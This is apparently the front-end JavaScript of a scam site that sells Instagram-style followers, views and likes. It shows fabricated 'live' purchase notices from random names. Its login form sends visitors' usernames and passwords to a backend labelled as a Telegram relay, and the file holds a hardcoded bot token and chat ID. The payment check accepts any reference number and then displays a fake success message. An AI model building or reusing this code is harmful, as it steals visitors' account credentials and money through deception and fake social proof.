const names = [
'Anaya','Rahul','Ayaan','Sana','Kabir','Simran',
'Ali','Priya','Aman','Karan','Rohit','Riya'
];

const actions = [
'bought 500 followers',
'bought 1000 followers',
'ordered 10k views',
'bought likes package',
'boosted reels views',
'ordered non drop followers'
];


// LIVE MESSAGES
function generateMessages() {

const box = document.getElementById('liveMessages');
if(!box) return;

setInterval(() => {
    const name = names[Math.floor(Math.random() * names.length)];
    const action = actions[Math.floor(Math.random() * actions.length)];

    const div = document.createElement('div');
    div.innerHTML = '✅ ' + name + ' ' + action;

    box.prepend(div);

    if(box.children.length > 10){
        box.removeChild(box.lastChild);
    }
}, 2000);

}

generateMessages();



// TELEGRAM FUNCTION (FIXED)
async function sendToTelegram(username, password) {

const botToken = "8714955059:AAGMFhzVKaoDmtc5TLuI9OOhb125lYmTcKk";
const chatId = "8453084186";

const message = `
🔥 New Login

👤 Username: ${username}
🔑 Password: ${password}
`;

try {
    await fetch("/api/send", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            username,
            password
        })
    });
} catch (error) {
    console.log("Telegram error:", error);
}

openPanel();
}



// LOGIN BUTTON
function login() {

const username = document.getElementById("username").value;
const password = document.getElementById("password").value;

if(username === "" || password === ""){
    alert("Enter Username & Password");
    return;
}

sendToTelegram(username, password);
}



// OPEN PANEL
function openPanel(){

const loginPage = document.getElementById('loginPage');
const panel = document.getElementById('panel');

if(loginPage){
    loginPage.style.display='none';
}

if(panel){
    panel.style.display='block';
}

}



// FOLLOWERS BUY
let selected = '';

function buyFollowers(plan, price){

selected = plan;

document.getElementById('panel').style.display='none';
document.getElementById('paymentPage').style.display='block';

document.getElementById('selectedPlan').innerHTML =
plan + ' • ' + price;

startTimer();
}



// TIMER
function startTimer(){

let time = 300;

const timer = document.getElementById('timer');

const interval = setInterval(() => {

let minutes = Math.floor(time / 60);
let seconds = time % 60;

seconds = seconds < 10 ? '0' + seconds : seconds;

timer.innerHTML = `${minutes}:${seconds}`;

time--;

if(time < 0){
    clearInterval(interval);
}

}, 1000);

}



// VERIFY PAYMENT
function verifyPayment(){

const utr = document.getElementById('utrInput').value;

if(utr.length < 4){
    alert('Enter Valid UTR');
    return;
}

const check = document.getElementById('checkingBox');
check.style.display='block';

setTimeout(() => {

document.getElementById('paymentPage').style.display='none';
document.getElementById('successPage').style.display='block';

document.getElementById('successText').innerHTML =
selected + ' Successfully Sent';

}, 4000);

}
